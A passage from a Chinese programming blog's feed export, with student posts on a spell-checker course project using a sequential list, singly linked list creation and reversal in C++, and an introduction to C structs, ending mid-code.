        <content type="html"><![CDATA[<p>2020数据结构课程设计之单词检查：</p><blockquote><p> <strong>单词检查(Ⅰ)- 顺序表实现</strong><br> 许多应用程序，如字处理软件，邮件客户端等，都包含了单词检查特性。单词检查是根据字典，找出输入文本中拼错的单词，我们认为凡是不出现在字典中的单词都是错误单词。不仅如此，一些检查程序还能给出类似拼错单词的修改建议单词。 例如字典由下面几个单词组成：<br>  bake cake main rain vase<br> 如果输入文件中有词vake ，检查程序就能发现其是一个错误的单词，并且给出 bake, cake或vase做为修改建议单词。<br> 修改建议单词可以采用如下生成技术：<br>  (1)在每一个可能位置插入‘a-‘z’中的一者<br>  (2)删除单词中的一个字符<br>  (3)用‘a’-‘z’中的一者取代单词中的任一字符<br> 很明显拼写检查程序的核心操作是在字典中查找某个单词，如果字典很大，性能无疑是非常关键的。<br> 你写的程序要求读入字典文件，然后对一个输入文件的单词进行检查，列出其中的错误单词并给出修改建议。</p></blockquote><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gcode">课程设计必须采用如下技术完成并进行复杂度分析及性能比较。<br><span class="hljs-comment">(1)</span>朴素的算法,用线性表维护字典<br><span class="hljs-comment">(2)</span>使用二叉排序树维护字典<br><span class="hljs-comment">(3)</span>采用hash技术维护字典<br><br>本题要求使用顺序表实现。<br></code></pre></td></tr></table></figure><p>基本思路：<br>   1）本题难点以及重点都在字符串的匹配问题上。如果完美匹配或需要替换一个字符，说明字符串长度与字典单词长度一致。又或者，字符串长度与字典单词长度差为±1，少一个或多一个，而且只能有一个字母的差异，其余的字母按顺序都相同，说明需要增或者减字母。</p><p>   2）有了上述思路，就要想办法用顺序表实现这个功能。从宏观的角度，要开一个大数组（大小&gt;=字典单词），其功能为储存匹配到的单词（建议修改成的）在字典中的序号。</p><p>   3）在遍历字典中的过程，开始匹配（模糊搜索）。每个字典单词都要与输入的字符串进行匹配（首先判断长度是否相等或差是否为±1）。</p><p>   4）如果长度相等，那么可能完美匹配，如何判断是否完美匹配呢？可以设置一个变量count，赋初值为0。用它来记录字符的失配次数。如果失配次数等于零，那么便是完美匹配啦！如果失配次数等于1，说明要替换单词。但如果失配次数大于1，便说明字符串无缘修改，直接break跳出单词字符的遍历。</p><p>   5）如果字符串长度大于字典单词长度，那么可能需要删减一个字符。同4的思路，需要设置一个记录失配次数的count变量，来判断是否真的需要删减一个字符（如果count&gt;1就没必要继续匹配了）。所以，在一开始判断字典单词与字符串长度的时候，我们需要利用if与else if语句分别处理三种长度比较的情况，count变量便可设置在if语句之外。但，如何在长度不相同的情况下来进行匹配字符呢？我们可以利用i，j两个变量，来记录匹配位置。（利用i来记录字符串的位置，利用j来记录字典单词的位置。遍历字符时，截至条件为长度较大的长度。如果两个字符失配，那么j–，这样便可继续按顺序匹配）。</p><p>   6）如果字符串长度小于字典单词长度，那么可能需要增加一个字符。思路同上，但需要注意的是，在记录匹配位置时有变化。</p><p>   7）因为自己太菜，输入问题困惑了好久（对我来说也是一个难题嘻嘻），下面贴上输入代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">while</span> (<span class="hljs-built_in">cin</span> &gt;&gt; Node[n].character)<span class="hljs-comment">//输入单词</span><br>&#123;<br><span class="hljs-keyword">if</span> (Node[n].character[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;#&#x27;</span>)<br><span class="hljs-keyword">break</span>;<br>Node[n].len = <span class="hljs-built_in">strlen</span>(Node[n].character);<br>n++;<br>&#125;<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">cin</span> &gt;&gt; search.character)<span class="hljs-comment">//检查单词</span><br>&#123;<br><span class="hljs-keyword">if</span> (search.character[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;#&#x27;</span>)<br><span class="hljs-keyword">break</span>;<br>search.len = <span class="hljs-built_in">strlen</span>(search.character);<br>match(search);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>常见错误：<br>1）输出的全部都是correct。判断是否完美匹配的代码放错了位置，因为当长度不满足上述三个情况时（相对于字典单词，字符串长度过大或过小），此时count也为0。所以如果把判断代码放在了末尾，那么势必会出错。</strong></p><p> <strong>2）答案部分正确。如果思路正确，大概率是格式错误。</strong></p><p> <strong>解决方案（第一个错误）：<br> 1.将判断语句紧跟在当长度相等if语句后。<br>                    2.设置一个flag标识符，在判断是否为完美匹配时，加上flag条件。</strong></p><pre><code>     下面是源码：           </code></pre><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br><span class="hljs-keyword">char</span> character[<span class="hljs-number">16</span>];<br><span class="hljs-keyword">int</span> len;<br>&#125;Node[<span class="hljs-number">10001</span>],search;<br><span class="hljs-keyword">int</span> n = <span class="hljs-number">0</span>;<span class="hljs-comment">//放在全局变量里，为了记录循环次数</span><br><span class="hljs-comment">//ADT</span><br><span class="hljs-keyword">int</span> match_flag[<span class="hljs-number">10001</span>];<span class="hljs-comment">//记录匹配单词在字典中的位置</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">match</span><span class="hljs-params">(struct Node search)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> i, j;<br><span class="hljs-keyword">int</span> p=<span class="hljs-number">0</span>;<span class="hljs-comment">//用来记录匹配的单词数目</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; n; k++)<br>&#123;<br><span class="hljs-keyword">int</span> flag = <span class="hljs-number">0</span>;<span class="hljs-comment">//记录是否不匹配</span><br><span class="hljs-keyword">int</span> count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (search.len == Node[k].len)<span class="hljs-comment">//字符串长度等于字典单词长度</span><br>&#123;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; search.len; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (search.character[i] != Node[k].character[i])<br>&#123;<br>count++;<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">1</span>)<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (!count)<br>flag = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (search.len == Node[k].len + <span class="hljs-number">1</span>)<span class="hljs-comment">//字符串长度大于字典单词长度</span><br>&#123;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; i &lt; search.len; i++, j++)<br>&#123;<br><span class="hljs-keyword">if</span> (search.character[i] != Node[k].character[j])<br>&#123;<br>j--;<br>count++;<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">1</span>)<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (search.len == Node[k].len - <span class="hljs-number">1</span>)<span class="hljs-comment">//字符串长度小于字典单词长度</span><br>&#123;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; j &lt; Node[k].len; i++, j++)<br>&#123;<br><span class="hljs-keyword">if</span> (search.character[i] != Node[k].character[j])<br>&#123;<br>i--;<br>count++;<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">1</span>)<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span> &amp;&amp; flag == <span class="hljs-number">1</span>)<span class="hljs-comment">//完美匹配</span><br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; search.character &lt;&lt; <span class="hljs-string">&quot; is correct&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (count == <span class="hljs-number">1</span>)<br>match_flag[p++] = k;<br>&#125;<br><span class="hljs-built_in">cout</span> &lt;&lt; search.character &lt;&lt; <span class="hljs-string">&quot;: &quot;</span>;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; p; i++)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; Node[match_flag[i]].character &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">cin</span> &gt;&gt; Node[n].character)<span class="hljs-comment">//输入单词</span><br>&#123;<br><span class="hljs-keyword">if</span> (Node[n].character[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;#&#x27;</span>)<br><span class="hljs-keyword">break</span>;<br>Node[n].len = <span class="hljs-built_in">strlen</span>(Node[n].character);<br>n++;<br>&#125;<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">cin</span> &gt;&gt; search.character)<span class="hljs-comment">//检查单词</span><br>&#123;<br><span class="hljs-keyword">if</span> (search.character[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;#&#x27;</span>)<br><span class="hljs-keyword">break</span>;<br>search.len = <span class="hljs-built_in">strlen</span>(search.character);<br>match(search);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课程设计 </tag>
            
            <tag> c/c++ </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构之单链表的创建和逆转</title>
      <link href="/2021/08/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA%E5%92%8C%E9%80%86%E8%BD%AC/"/>
      <url>/2021/08/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA%E5%92%8C%E9%80%86%E8%BD%AC/</url>
      
        <content type="html"><![CDATA[<p>一、单链表的创建</p><ul><li>前插法（头插法）</li><li>后插法</li></ul><p>二、单链表的逆转</p><h2 id="一、单链表的创建"><a href="#一、单链表的创建" class="headerlink" title="一、单链表的创建"></a><strong>一、单链表的创建</strong></h2><p>1.前插法：<br><img src="https://img-blog.csdnimg.cn/20200409183757683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2VsZWdhbnRfY2hlYXRlcg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>思路：总将新节点插到链表前端，成为首元节点。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span> &#123;</span><br>    ElemType data; <span class="hljs-comment">//结点的数据域</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span>* <span class="hljs-title">next</span>;</span> <span class="hljs-comment">//结点的指针域</span><br>&#125; LNode, * LinkList; <span class="hljs-comment">//LinkList为指向结构体LNode的指针类型</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">create_list_h</span><span class="hljs-params">(LinkList &amp;L,<span class="hljs-keyword">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>L=<span class="hljs-keyword">new</span> LNode;<br>L-&gt;next=<span class="hljs-literal">NULL</span>;<span class="hljs-comment">//建立带头结点的单链表</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=n;i&gt;<span class="hljs-number">0</span>;i--)<br>&#123;<br>LinkList p=<span class="hljs-keyword">new</span> LNode;<span class="hljs-comment">//生成新结点</span><br><span class="hljs-built_in">cin</span>&gt;&gt;p-&gt;data;<span class="hljs-comment">//输入元素值</span><br>p-&gt;next=L-&gt;next;<br>L-&gt;next=p;<span class="hljs-comment">//插入到表头</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.后插法：<br><img src="https://img-blog.csdnimg.cn/2020040919285834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2VsZWdhbnRfY2hlYXRlcg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>思路：总将节点插到链表的尾部</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span> &#123;</span><br>    ElemType data; <span class="hljs-comment">//结点的数据域</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span>* <span class="hljs-title">next</span>;</span> <span class="hljs-comment">//结点的指针域</span><br>&#125; LNode, * LinkList; <span class="hljs-comment">//LinkList为指向结构体LNode的指针类型</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">create_list_r</span><span class="hljs-params">(LinkList &amp;L,<span class="hljs-keyword">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>L=<span class="hljs-keyword">new</span> LNode;<br>L-&gt;next=<span class="hljs-literal">NULL</span>;<br>LinkList P=L;<span class="hljs-comment">//尾指针指向头节点</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br>LinkList q=<span class="hljs-keyword">new</span> LNode;<br><span class="hljs-built_in">cin</span>&gt;&gt;q-&gt;data;<br>q-&gt;next=<span class="hljs-literal">NULL</span>;<br>P-&gt;next=q;<span class="hljs-comment">//插入到表尾</span><br>P=q;<span class="hljs-comment">//q指向新的尾节点</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="二、单链表的逆转"><a href="#二、单链表的逆转" class="headerlink" title="二、单链表的逆转"></a>二、单链表的逆转</h2><p><img src="https://img-blog.csdnimg.cn/20200409195234274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2VsZWdhbnRfY2hlYXRlcg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><strong>思路：先把链表一分为二，再利用前插法逐一接到头结点处。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span> &#123;</span><br>    ElemType data; <span class="hljs-comment">//结点的数据域</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span>* <span class="hljs-title">next</span>;</span> <span class="hljs-comment">//结点的指针域</span><br>&#125; LNode, * LinkList; <span class="hljs-comment">//LinkList为指向结构体LNode的指针类型</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">list_inverse</span><span class="hljs-params">(LinkList &amp;L)</span></span><br><span class="hljs-function"></span>&#123;<br>LinkList P,q;<br>P=L-&gt;next;<br>L-&gt;next=<span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">//将链表一分为二</span><br><span class="hljs-keyword">while</span>(P)<br>&#123;<br>q=P-&gt;next;<span class="hljs-comment">//q指向*p的后继节点；</span><br>P-&gt;next=L-&gt;next;<br>L-&gt;next=P;<span class="hljs-comment">//*p插在头节点后</span><br>P=q;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> c/c++ </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈对结构体的理解</title>
      <link href="/2021/08/01/%E6%B5%85%E8%B0%88%E5%AF%B9%E7%BB%93%E6%9E%84%E4%BD%93%E7%9A%84%E7%90%86%E8%A7%A3/"/>
      <url>/2021/08/01/%E6%B5%85%E8%B0%88%E5%AF%B9%E7%BB%93%E6%9E%84%E4%BD%93%E7%9A%84%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p><strong>本文是学习过程中的思考与总结，存在许多不妥之处，若有幸被大牛指点出纰漏，必当及时更正，感激不尽！</strong></p><pre><code>一、什么是结构体？二、结构体数组与结构体指针三、结构体指针作为函数参数四、typedef的用法</code></pre><p><strong>一、什么是结构体？</strong></p><p>可以把结构体当作自定义的数据类型，它相当于一个容器，里面容纳了许多的基本数据类型（int ,float ,char ,double…诸如此类）。姑且把结构体所容纳的变量叫做成员变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span>&#123;</span><br>    <span class="hljs-keyword">char</span> *name;  <span class="hljs-comment">//姓名</span><br>    <span class="hljs-keyword">int</span> num;  <span class="hljs-comment">//学号</span><br>    <span class="hljs-keyword">int</span> age;  <span class="hljs-comment">//年龄</span><br>    <span class="hljs-keyword">char</span> group;  <span class="hljs-comment">//所在学习小组</span><br>    <span class="hljs-keyword">float</span> score;  <span class="hljs-comment">//成绩</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>注意：结构体大括号后面的；不能丢，否则不是完整的语句。</strong></p><p>既然结构体是一种数据类型，那么就可以用它来定义变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span>&#123;</span><br>    <span class="hljs-keyword">char</span> *name;  <span class="hljs-comment">//姓名</span><br>    <span class="hljs-keyword">int</span> num;  <span class="hljs-comment">//学号</span><br>    <span class="hljs-keyword">int</span> age;  <span class="hljs-comment">//年龄</span><br>    <span class="hljs-keyword">char</span> group;  <span class="hljs-comment">//所在学习小组</span><br>    <span class="hljs-keyword">float</span> score;  <span class="hljs-comment">//成绩</span><br>&#125; stu1, stu2;<span class="hljs-comment">//这是一种定义变量的方法，直接在大括号尾部定义</span><br><br><span class="hljs-comment">//还可以如下定义</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span> <span class="hljs-title">stu3</span>,<span class="hljs-title">stu4</span>;</span><span class="hljs-comment">//定义的时候，struct stu作为整体出现</span><br></code></pre></td></tr></table></figure><p>上述代码中，stu1与stu2便是由stu数据类型定义的变量（类比于int类型定义stu1与stu2）。</p><p><font color=#6495ED><strong>需要注意的是:结构体是创建变量的模板（没东西的容器），不占用内存；结构体变量才包含了真实的数据，需要内存来存储。</strong></font></p><p><strong>二、结构体数组与结构体指针</strong></p><p>类比着讲更容易理解。<br>拿int类型举例，int可以定义整型数组，类比来看，结构体数据类型，同样可以定义数组。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span>&#123;</span><br>    <span class="hljs-keyword">char</span> *name;  <span class="hljs-comment">//姓名</span><br>    <span class="hljs-keyword">int</span> num;  <span class="hljs-comment">//学号</span><br>    <span class="hljs-keyword">int</span> age;  <span class="hljs-comment">//年龄</span><br>    <span class="hljs-keyword">char</span> group;  <span class="hljs-comment">//所在小组 </span><br>    <span class="hljs-keyword">float</span> score;  <span class="hljs-comment">//成绩</span><br>&#125;;<br><span class="hljs-comment">//先定义一个结构体数据类型</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> i[<span class="hljs-number">5</span>];<span class="hljs-comment">//定义整型数组</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span> <span class="hljs-title">j</span>[5];</span><span class="hljs-comment">//定义stu类型数组</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>从代码中可以发现，stu类型数组<strong>j</strong>包含了五组stu内部的成员变量（name，num，age，group，score）。</p><p>结构体数组的使用很简单<code>j[0].score;</code>表示的意思就是stu类型的j数组中第一组score。</p><p>当一个指针变量指向结构体时，我们就称它为<font color=#0099ff><strong>结构体指针。</strong></font></p><p>注意:结构体变量名和数组名不同，数组名在表达式中会被转换为数组指针，而结构体变量名不会，无论在任何表达式中它表示的都是整个集合本身，要想取得结构体变量的地址，必须在前面加<code>&amp;</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span>&#123;</span><br>    <span class="hljs-keyword">char</span> *name;  <span class="hljs-comment">//姓名</span><br>    <span class="hljs-keyword">int</span> num;  <span class="hljs-comment">//学号</span><br>    <span class="hljs-keyword">int</span> age;  <span class="hljs-comment">//年龄</span><br>    <span class="hljs-keyword">char</span> group;  <span class="hljs-comment">//所在学习小组</span><br>    <span class="hljs-keyword">float</span> score;  <span class="hljs-comment">//成绩</span><br>&#125; stu1, stu2;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span> *<span class="hljs-title">pstu</span>=</span>&amp;stu1;<span class="hljs-comment">//只能这样赋值</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span> *<span class="hljs-title">pstu</span>=</span>stu1;<span class="hljs-comment">//这样赋值是错的</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过结构体指针可获得结构体中的成员，<code>(*pstu).score</code>或者<code>pstu-&gt;score</code>。</p><p>三、结构体变量作为函数参数</p><p><font color=#6495ED>结构体变量名代表的是整个容器，里面所有成员作为一个集合在一起。</font>而不是同数组一样被编译器转换成指针，用结构体变量传参会极大影响程序的效率。最好的方法就是使用指针，这时由实参传向形参的只是一个地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span>&#123;</span><br>    <span class="hljs-keyword">char</span> *name;  <span class="hljs-comment">//姓名</span><br>    <span class="hljs-keyword">int</span> num;  <span class="hljs-comment">//学号</span><br>    <span class="hljs-keyword">int</span> age;  <span class="hljs-comment">//年龄</span><br>    <span class="hljs-keyword">char</span> group;  <span class="hljs-comment">//所在学习小组</span><br>    <span class="hljs-keyword">float</span> score;  <span class="hljs-comment">//成绩</span><br>&#125; stu1, stu2;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">(struct stu *pstu)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>stu1.score=<span class="hljs-number">99.5</span>;<br>test(&amp;stu1);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">(struct stu *pstu1)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span 